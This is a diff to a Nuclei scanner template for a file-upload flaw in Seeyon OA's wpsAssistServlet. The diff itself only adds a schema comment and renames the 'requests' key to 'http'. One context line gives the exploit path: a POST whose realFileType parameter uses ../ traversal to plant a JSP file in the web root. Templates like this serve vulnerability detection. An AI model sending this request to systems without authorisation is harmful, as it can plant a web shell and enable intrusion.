@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: Seeyon-wpsAssistServlet-upload
 
 info:
@@ -8,7 +9,7 @@ info:
     - https://github.com/coldrainh
   tags: Seeyon,oa,upload
 
-requests:
+http:
   - method: POST
     path:
       - '{{BaseURL}}/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/debugggg.jsp&fileId=2'
